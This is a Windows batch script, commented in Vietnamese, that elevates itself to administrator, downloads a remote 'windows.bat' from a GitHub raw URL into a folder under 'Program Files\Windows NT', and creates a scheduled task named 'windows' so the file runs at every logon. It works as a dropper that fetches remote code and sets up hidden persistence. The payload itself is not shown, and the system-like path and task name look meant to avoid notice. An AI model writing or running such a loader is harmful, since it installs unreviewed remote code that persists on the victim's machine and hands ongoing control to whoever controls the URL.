@echo off
:: Kiem tra quyen quan tri
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Vui long chay voi quyen quan tri.
    powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

:: Thiet lap bien
set "downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/windows.bat"
set "destinationDir=C:\Program Files\Windows NT\coccoc"
set "downloadFile=windows.bat"
set "logFile=%destinationDir%\task_history_log.txt"

:: Tao thu muc neu chua ton tai
if not exist "%destinationDir%" (
    echo Thu muc %destinationDir% khong ton tai. Dang tao thu muc...
    mkdir "%destinationDir%"
)

:: Chuyen den thu muc dich
cd /d "%destinationDir%"

:: Tai xuong tep bang curl
echo Dang tai xuong windows.bat...
echo %date% %time% - Bat dau tai xuong tu %downloadUrl% >> "%logFile%"
curl -L -o "%downloadFile%" "%downloadUrl%"

:: Kiem tra xem tep da tai xuong thanh cong chua
if exist "%downloadFile%" (
    echo %date% %time% - windows.bat da tai xuong thanh cong. >> "%logFile%"
) else (
    echo %date% %time% - Tai xuong windows.bat that bai. >> "%logFile%"
    exit
)

:: Tao tac vu trong Task Scheduler
echo Dang tao tac vu...
schtasks /create /tn "windows" /tr "\"%destinationDir%\%downloadFile%\"" /sc onlogon /ru "%USERNAME%" /f

:: Kiem tra ket qua
if %errorlevel% neq 0 (
    echo %date% %time% - Tao tac vu that bai. >> "%logFile%"
    echo Tao tac vu that bai.
) else (
    echo %date% %time% - Tac vu tao thanh cong. >> "%logFile%"
    echo Tac vu tao thanh cong.
)

exit
